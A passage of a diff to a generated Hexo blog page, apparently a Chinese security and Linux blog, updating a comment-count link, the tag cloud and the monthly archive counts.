-<h3 id="exit"><a href="#exit" class="headerlink" title="exit()"></a>exit()</h3>
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/08/07/2016/say-2/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/07/2016/say-2/" data-count-type="comments">&nbsp;</a>
+		<a href="/08/07/2016/xss-4/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/07/2016/xss-4/" data-count-type="comments">&nbsp;</a>
 	
 </div>
 
@@ -727,7 +778,7 @@
   <div class="tagcloudlist">
     <p class="asidetitle">标签云</p>
     <div class="tagcloudlist clearfix">
-       <a href="/tags/Arch/" style="font-size: 10px;">Arch</a> <a href="/tags/Bootstrap/" style="font-size: 10px;">Bootstrap</a> <a href="/tags/CodeIgniter/" style="font-size: 12.5px;">CodeIgniter</a> <a href="/tags/Device/" style="font-size: 13.75px;">Device</a> <a href="/tags/English/" style="font-size: 10px;">English</a> <a href="/tags/G4W/" style="font-size: 10px;">G4W</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/JavaScript/" style="font-size: 20px;">JavaScript</a> <a href="/tags/Kali/" style="font-size: 12.5px;">Kali</a> <a href="/tags/Linux/" style="font-size: 18.75px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 15px;">MySQL</a> <a href="/tags/Note/" style="font-size: 10px;">Note</a> <a href="/tags/RWD/" style="font-size: 10px;">RWD</a> <a href="/tags/SQLInjection/" style="font-size: 11.25px;">SQLInjection</a> <a href="/tags/Shell/" style="font-size: 13.75px;">Shell</a> <a href="/tags/XSS/" style="font-size: 17.5px;">XSS</a> <a href="/tags/cmd/" style="font-size: 10px;">cmd</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/daily/" style="font-size: 15px;">daily</a> <a href="/tags/dns/" style="font-size: 10px;">dns</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/hard/" style="font-size: 12.5px;">hard</a> <a href="/tags/intranet/" style="font-size: 10px;">intranet</a> <a href="/tags/nexus5x/" style="font-size: 12.5px;">nexus5x</a> <a href="/tags/parties/" style="font-size: 10px;">parties</a> <a href="/tags/port/" style="font-size: 10px;">port</a> <a href="/tags/soft/" style="font-size: 12.5px;">soft</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/书记/" style="font-size: 16.25px;">书记</a> <a href="/tags/生活/" style="font-size: 10px;">生活</a> <a href="/tags/闲谈/" style="font-size: 12.5px;">闲谈</a>
+       <a href="/tags/Arch/" style="font-size: 10px;">Arch</a> <a href="/tags/Bootstrap/" style="font-size: 10px;">Bootstrap</a> <a href="/tags/CodeIgniter/" style="font-size: 12.5px;">CodeIgniter</a> <a href="/tags/Device/" style="font-size: 13.75px;">Device</a> <a href="/tags/English/" style="font-size: 10px;">English</a> <a href="/tags/G4W/" style="font-size: 10px;">G4W</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/JavaScript/" style="font-size: 20px;">JavaScript</a> <a href="/tags/Kali/" style="font-size: 12.5px;">Kali</a> <a href="/tags/Linux/" style="font-size: 18.75px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 15px;">MySQL</a> <a href="/tags/Note/" style="font-size: 10px;">Note</a> <a href="/tags/RWD/" style="font-size: 10px;">RWD</a> <a href="/tags/SQLInjection/" style="font-size: 11.25px;">SQLInjection</a> <a href="/tags/Shell/" style="font-size: 13.75px;">Shell</a> <a href="/tags/XSS/" style="font-size: 17.5px;">XSS</a> <a href="/tags/cmd/" style="font-size: 10px;">cmd</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/daily/" style="font-size: 15px;">daily</a> <a href="/tags/dns/" style="font-size: 10px;">dns</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/hard/" style="font-size: 12.5px;">hard</a> <a href="/tags/i18n/" style="font-size: 10px;">i18n</a> <a href="/tags/intranet/" style="font-size: 10px;">intranet</a> <a href="/tags/nexus5x/" style="font-size: 12.5px;">nexus5x</a> <a href="/tags/parties/" style="font-size: 10px;">parties</a> <a href="/tags/port/" style="font-size: 10px;">port</a> <a href="/tags/soft/" style="font-size: 12.5px;">soft</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/书记/" style="font-size: 16.25px;">书记</a> <a href="/tags/生活/" style="font-size: 10px;">生活</a> <a href="/tags/闲谈/" style="font-size: 12.5px;">闲谈</a>
     </div>
   </div>
 
@@ -735,7 +786,7 @@
   
   <div class="archiveslist">
     <p class="asidetitle"><a href="/archives">归档</a></p>
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">十一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">十月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">九月 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">七月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">五月 2016</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">十一月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">十月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">九月 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">七月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">五月 2016</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
   </div>
 
 
